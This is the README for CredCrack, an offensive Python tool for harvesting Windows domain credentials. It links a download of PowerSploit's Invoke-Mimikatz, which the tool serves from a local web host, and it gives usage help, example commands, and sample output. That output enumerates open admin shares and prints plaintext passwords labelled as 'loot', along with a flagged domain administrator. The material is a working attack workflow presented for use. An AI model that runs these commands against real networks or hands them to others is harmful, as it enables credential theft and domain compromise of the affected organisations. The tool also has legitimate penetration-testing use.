# CredCrack

##Introduction
-----

CredCrack is a fast and stealthy credential harvester. It exfiltrates credentials recusively in memory and in the clear. Upon completion, CredCrack will parse and output the credentials while identifying any domain administrators obtained. CredCrack also comes with the ability to list and enumerate share access and yes, it is threaded!

CredCrack has been tested and runs with the tools found natively in Kali Linux. CredCrack solely relies on having PowerSploit's "Invoke-Mimikatz.ps1" under the /var/www directory. [Download Invoke-Mimikatz Here](https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)

## Help
-----
```
usage: credcrack.py [-h] -d DOMAIN -u USER [-f FILE] [-r RHOST] [-es]
                    [-l LHOST] [-t THREADS]

CredCrack - A stealthy credential harvester by Jonathan Broche (@g0jhonny)

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  File containing IPs to harvest creds from. One IP per
                        line.
  -r RHOST, --rhost RHOST
                        Remote host IP to harvest creds from.
  -es, --enumshares     Examine share access on the remote IP(s)
  -l LHOST, --lhost LHOST
                        Local host IP to launch scans from.
  -t THREADS, --threads THREADS
                        Number of threads (default: 10)

Required:
  -d DOMAIN, --domain DOMAIN
                        Domain or Workstation
  -u USER, --user USER  Domain username

Examples: 

./credcrack.py -d acme -u bob -f hosts -es
./credcrack.py -d acme -u bob -f hosts -l 192.168.1.102 -t 20
```

## Examples
-----

###Enumerating Share Access

```
./credcrack.py -r 192.168.1.100 -d acme -u bob --es
Password:
 ---------------------------------------------------------------------
  CredCrack v1.1 by Jonathan Broche (@g0jhonny)
 ---------------------------------------------------------------------
 
[*] Validating 192.168.1.102
[*] Validating 192.168.1.103
[*] Validating 192.168.1.100

 -----------------------------------------------------------------
 192.168.1.102 - Windows 7 Professional 7601 Service Pack 1 
 -----------------------------------------------------------------
 
 OPEN      \\192.168.1.102\ADMIN$ 
 OPEN      \\192.168.1.102\C$ 

 -----------------------------------------------------------------
 192.168.1.103 - Windows Vista (TM) Ultimate 6002 Service Pack 2 
 -----------------------------------------------------------------
 
 OPEN      \\192.168.1.103\ADMIN$ 
 OPEN      \\192.168.1.103\C$ 
 CLOSED    \\192.168.1.103\F$ 

 -----------------------------------------------------------------
 192.168.1.100 - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 
 -----------------------------------------------------------------
 
 CLOSED    \\192.168.1.100\ADMIN$ 
 CLOSED    \\192.168.1.100\C$ 
 OPEN      \\192.168.1.100\NETLOGON 
 OPEN      \\192.168.1.100\SYSVOL 

[*] Done! Completed in 0.8s
```

###Harvesting credentials
-----

```
./credcrack.py -f hosts -d acme -u bob -l 192.168.1.100
Password:

 ---------------------------------------------------------------------
  CredCrack v1.1 by Jonathan Broche (@g0jhonny)
 ---------------------------------------------------------------------
 
[*] Setting up the stage
[*] Validating 192.168.1.102
[*] Validating 192.168.1.103
[*] Querying domain admin group from 192.168.1.102
[*] Harvesting credentials from 192.168.1.102
[*] Harvesting credentials from 192.168.1.103

                  The loot has arrived...
                         __________
                        /\____;;___\    
                       | /         /    
                       `. ())oo() .      
                        |\(%()*^^()^\       
                       %| |-%-------|       
                      % \ | %  ))   |       
                      %  \|%________|       

                
[*] Host: 192.168.1.102 Domain: ACME User: jsmith Password: Good0ljm1th
[*] Host: 192.168.1.103 Domain: ACME User: daguy Password: P@ssw0rd1!

     1 domain administrators found and highlighted in yellow above!

[*] Cleaning up
[*] Done! Loot may be found under /root/CCloot folder
[*] Completed in 11.3s
```

####Contact
Contact me at [@g0jhonny](https://twitter.com/g0jhonny) with any questions or features you'd like to see in the next update. For bugs submit an [issue](https://github.com/gojhonny/CredCrack/issues/new)!

####Credits
CredCrack couldn't have been possible without the contributions of the following individuals. You're all rockstars!
[@JosephBialek](https://twitter.com/JosephBialek), [@brav0hax](https://twitter.com/brav0hax), [@altonjx](https://twitter.com/altonjx) and everyone else! Thank you for all your contributions and feedback to make this a better script, keep 'em coming! 
